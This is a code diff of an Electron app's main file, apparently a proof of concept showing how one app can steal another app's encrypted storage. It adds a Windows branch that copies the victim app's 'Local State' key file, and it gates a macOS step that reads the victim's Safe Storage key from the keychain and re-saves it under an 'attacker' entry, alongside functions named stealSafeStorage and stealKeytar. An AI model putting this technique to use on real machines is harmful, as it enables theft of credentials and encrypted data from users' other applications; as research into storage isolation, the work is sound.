@@ -3,17 +3,27 @@ const serve = require('electron-serve');
 const keytar = require('keytar');
 const path = require('path');
 const {rm, cp} = require('node:fs/promises');
+const { cpSync } = require('node:fs');
+const { platform } = require('node:process');
 const { session } = require('electron')
 
 const loadURL = serve({directory: __dirname});
+
+if (platform === 'win32') {
+  const userPath = app.getPath('userData');
+  cpSync(`${userPath}/../demo/Local State`, `${userPath}/Local State`);
+}
 
 async function stealSafeStorage() {
   const userPath = app.getPath('userData');
   const dbPath = 'IndexedDB/app_-_0.indexeddb.leveldb/';
   await rm(`${userPath}/${dbPath}`, {recursive: true, force: true});
   await cp(`${userPath}/../demo/${dbPath}`, `${userPath}/${dbPath}`, { recursive: true});
-  const key = await keytar.getPassword('demo Safe Storage', 'demo');
-  await keytar.setPassword('attacker Safe Storage', 'attacker', key);
+  
+  if (platform === 'darwin') {
+    const key = await keytar.getPassword('demo Safe Storage', 'demo');
+    await keytar.setPassword('attacker Safe Storage', 'attacker', key);
+  }
 }
 
 async function stealKeytar() {
